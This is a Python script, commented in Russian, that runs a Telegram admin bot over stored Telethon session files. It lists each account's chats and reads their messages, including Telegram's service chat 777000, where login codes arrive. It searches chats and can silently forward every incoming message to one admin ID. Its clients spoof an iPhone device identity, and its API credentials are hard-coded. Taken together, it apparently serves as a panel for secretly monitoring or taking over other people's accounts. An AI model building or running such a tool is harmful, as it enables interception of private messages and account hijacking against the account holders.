import os
import sys
import asyncio
from telethon import TelegramClient, events
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.filters import Command

# === Конфиг ===
API_ID = 27258770
API_HASH = "8eda3f168522804bead42bfe705bdaeb"
ADMIN_ID = 7549204023
BOT_TOKEN = "Song"

# === Папка для сессий ===
if not os.path.exists("sessions"):
    os.makedirs("sessions")

# === Aiogram-бот ===
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# --- Глобальные состояния ---
active_monitors = {}   # {session: client}
search_state = {}      # {user_id: (session, chat_id)}

# --- Утилиты ---
def safe_filename(phone: str) -> str:
    return phone.replace("+", "").replace(" ", "").strip()

def get_sessions():
    files = os.listdir("sessions")
    return [f.replace(".session", "") for f in files if f.endswith(".session")]

async def get_chats(session_name):
    client = TelegramClient(
        f"sessions/{session_name}",
        API_ID,
        API_HASH,
        device_model="iPhone 13 Pro",
        system_version="iOS 18.1.1",
        app_version="9.6.0"
    )
    chats = []
    async with client:
        dialogs = await client.get_dialogs()
        for d in dialogs[:10]:  # только первые 10 чатов
            chats.append((d.name or "Без имени", d.id))
    return chats

async def get_messages(session_name, chat_id):
    client = TelegramClient(f"sessions/{session_name}", API_ID, API_HASH)
    msgs = []
    async with client:
        async for msg in client.iter_messages(chat_id, limit=5):
            if msg.text:
                msgs.append(f"{msg.sender_id}: {msg.text}")
    return msgs

# --- Онлайн-мониторинг ---
async def start_monitoring(session):
    client = TelegramClient(f"sessions/{session}", API_ID, API_HASH)
    await client.start()

    @client.on(events.NewMessage(incoming=True))
    async def handler(event):
        chat = await event.get_chat()
        name = getattr(chat, "title", None) or getattr(chat, "first_name", "ЛС")
        text = event.text or "📎 Медиа"
        await bot.send_message(ADMIN_ID, f"📩 [{session}] {name}:\n{text}")

    active_monitors[session] = client
    await client.run_until_disconnected()

# --- Главное меню ---
def get_main_menu():
    buttons = [
        [InlineKeyboardButton(text=f"👤 {s}", callback_data=f"account:{s}")]
        for s in get_sessions()
    ]
    if not buttons:
        buttons = [[InlineKeyboardButton(text="❌ Нет аккаунтов", callback_data="none")]]
    buttons.append([InlineKeyboardButton(text="➕ Добавить аккаунт", callback_data="add")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

# --- Хэндлеры ---
@dp.message(Command("start"))
async def start(msg: types.Message):
    if msg.from_user.id == ADMIN_ID:
        await msg.answer("👑 Выбери аккаунт:", reply_markup=get_main_menu())
    else:
        await msg.answer("🚫 Нет доступа.")

@dp.callback_query()
async def handle_callback(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        await call.message.answer("🚫 Нет доступа.")
        return

    data = call.data.split(":")
    action = data[0]

    # Меню аккаунта
    if action == "account":
        session = data[1]
        chats = await get_chats(session)
        buttons = [
            [InlineKeyboardButton(text=f"💬 {name}", callback_data=f"chat:{session}:{chat_id}")]
            for name, chat_id in chats
        ]
        buttons.append([InlineKeyboardButton(text="💠 Telegram", callback_data=f"tgchat:{session}")])
        buttons.append([InlineKeyboardButton(text="📡 Мониторинг", callback_data=f"monitor:{session}")])
        buttons.append([InlineKeyboardButton(text="🔙 Назад", callback_data="back")])
        await call.message.answer(f"📂 Меню аккаунта `{session}`:", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

    # Чат → последние сообщения
    elif action == "chat":
        session, chat_id = data[1], int(data[2])
        msgs = await get_messages(session, chat_id)
        text = "\n".join(msgs) if msgs else "❌ Нет сообщений"
        buttons = [
            [InlineKeyboardButton(text="🔍 Поиск", callback_data=f"search:{session}:{chat_id}")],
            [InlineKeyboardButton(text="🔙 Назад", callback_data=f"account:{session}")]
        ]
        await call.message.answer(f"💬 Сообщения:\n\n{text}", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

    # Чат с Telegram (777000)
    elif action == "tgchat":
        session = data[1]
        msgs = await get_messages(session, 777000)
        text = "\n".join(msgs) if msgs else "❌ Нет сообщений"
        buttons = [[InlineKeyboardButton(text="🔙 Назад", callback_data=f"account:{session}")]]
        await call.message.answer(f"💠 Чат с Telegram:\n\n{text}", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

    # Мониторинг
    elif action == "monitor":
        session = data[1]
        if session in active_monitors:
            await call.message.answer(f"⚡ Мониторинг `{session}` уже активен")
        else:
            asyncio.create_task(start_monitoring(session))
            await call.message.answer(f"📡 Мониторинг `{session}` запущен")

    # Поиск
    elif action == "search":
        session, chat_id = data[1], int(data[2])
        search_state[call.from_user.id] = (session, chat_id)
        await call.message.answer("🔍 Введи слово для поиска в этом чате:")

    elif action == "back":
        await call.message.answer("🔙 Главное меню:", reply_markup=get_main_menu())

    elif action == "add":
        await call.message.answer("📲 Добавление аккаунта пока через консоль:\n\n`python3 main.py register`")

# --- Обработка поиска ---
@dp.message()
async def handle_search(msg: types.Message):
    if msg.from_user.id in search_state:
        session, chat_id = search_state.pop(msg.from_user.id)
        client = TelegramClient(f"sessions/{session}", API_ID, API_HASH)
        results = []
        async with client:
            async for m in client.iter_messages(chat_id, limit=200):
                if m.text and msg.text.lower() in m.text.lower():
                    results.append(m.text)
                    if len(results) >= 5:
                        break
        text = "\n\n".join(results) if results else "❌ Ничего не найдено"
        await msg.answer(f"🔍 Результаты поиска:\n\n{text}")

# --- Регистрация нового аккаунта ---
async def register_account():
    phone = input("📱 Введите номер телефона (например +491234567890): ").strip()
    session_name = f"sessions/{safe_filename(phone)}"

    client = TelegramClient(
        session_name,
        API_ID,
        API_HASH,
        device_model="iPhone 13 Pro",
        system_version="iOS 18.1.1",
        app_version="9.6.0"
    )

    async with client:
        await client.start(phone=phone)
        me = await client.get_me()
        print(f"✅ Авторизация успешна: {me.first_name} ({me.id})")
        print(f"💾 Сессия сохранена: {session_name}.session")

# --- Точка входа ---
async def main():
    if len(sys.argv) > 1 and sys.argv[1] == "register":
        await register_account()
    else:
        await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
